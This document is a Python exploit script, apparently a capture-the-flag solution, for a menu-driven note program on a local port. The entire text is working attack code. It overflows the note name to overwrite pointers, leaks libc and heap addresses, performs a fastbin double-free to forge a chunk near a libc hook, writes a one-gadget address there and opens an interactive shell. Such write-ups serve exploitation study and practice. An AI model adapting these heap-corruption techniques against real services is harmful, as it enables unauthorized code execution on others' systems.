import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def skip_menu():
    read_until(f, '>> ')


def add_note(name, desc):
    skip_menu()
    f.write('1\n')

    read_until(f, 'ID : ')
    id_ = int(read_until(f))

    read_until(f, 'name: ')
    name_buf = name + '\n'
    f.write(name_buf[:0x50])

    read_until(f, 'desc: ')
    desc_buf = desc + '\n'
    f.write(desc_buf[:0x100])

    return id_


def edit_note(index, name, size, desc):
    skip_menu()
    f.write('2\n')
    read_until(f, 'index: ')
    f.write(str(index) + '\n')

    read_until(f, 'name: ')
    name_buf = name + '\n'
    f.write(name_buf[:0x50])

    read_until(f, 'size: ')
    f.write(str(size) + '\n')

    read_until(f, 'desc: ')
    desc_buf = desc + '\n'
    f.write(desc_buf[:0x100])


def remove_note(index):
    skip_menu()
    f.write('3\n')
    read_until(f, 'idx: ')
    f.write(str(index) + '\n')


def view_note(index):
    skip_menu()
    f.write('4\n')
    read_until(f, 'idx: ')
    f.write(str(index) + '\n')

    read_until(f, 'Name : ')
    name = read_until(f, 'Size : ')[:-len('Size : ')]
    name = name.rstrip('\n')

    read_until(f, 'Description : ')
    desc = read_until(f, '1)')[:-len('1)')]
    desc = desc.rstrip('\n')

    return (name, desc)


def exit():
    skip_menu()
    f.write('5\n')

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)

# id: 0
add_note('note0', 'notecontent0')
edit_note(0, 'A' * 0x50, 10, 'B' * 0x8 + p64(0x601f80)) # addr_puts
# id: 1
add_note('note1', 'notecontent1')
edit_note(1, 'C' * 0x50, 10, 'D' * 0x8 + p64(0x602040)) # addr_table_of_ptrs2notes

# leak libc
name, desc = view_note(0)
addr_puts = u64(desc.ljust(8, '\x00'))
addr_libc = addr_puts - 0x6f690
#print '[+] addr_puts = {}'.format(hex(addr_puts))
print '[+] addr_libc = {}'.format(hex(addr_libc))

# leak heap address
name, desc = view_note(1)
addr_heap = u64(desc.ljust(8, '\x00')) - 0x1040
print '[+] addr_heap = {}'.format(hex(addr_heap))


# prepare chunks for fastbin dup attack
add_note('note2', 'notecontent2')
add_note('note3', 'notecontent3')
add_note('note4', 'notecontent4')
add_note('note5', 'notecontent5')

# we are going to double free note id 2
addr_df_chunk = addr_heap + 0x11a0
print '[+] Address of chunk we are going to double free = {}'.format(hex(addr_df_chunk))
print '[+] Free first time'
remove_note(2)
# before actually double freeing free id 3 to avoid corruption
print '[+] Remove to avoid corruption'
remove_note(3)

#print '[+] double free note id = {}'.format(df_id)
# make new note's desc pointer to already freed chunk
edit_note(4, 'E' * 0x50, 10, 'F' * 0x8 + p64(addr_df_chunk))
# useless chunk just to avoid consolidation with top (id: 1)
# double free here
print '[+] Double free {}'.format(hex(addr_df_chunk))
remove_note(4)

# Becareful that chunk with "EEEEE...." will be linked to the same fastbins list
id_ = add_note('remove', 'removenote')

print '[+] Add note with fake fd'
addr_fake_fd = addr_libc + 0x3c4aed
id_ = add_note(p64(addr_fake_fd), 'fakechunk')

id_ = add_note('remove', 'removenote')
id_ = add_note('remove', 'removenote')

print '[+] Return wanted pointer!'
one_gadet_offets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
addr_one_gadet = addr_libc + one_gadet_offets[2]
print '[+] addr_one_gadet = {}'.format(hex(addr_one_gadet))
buf = 'G' * 0x13 + p64(addr_one_gadet)
id_ = add_note(buf, 'pleaseopenshell')

edit_note(5, 'hoge', 10, 'hoge')

shell(s)
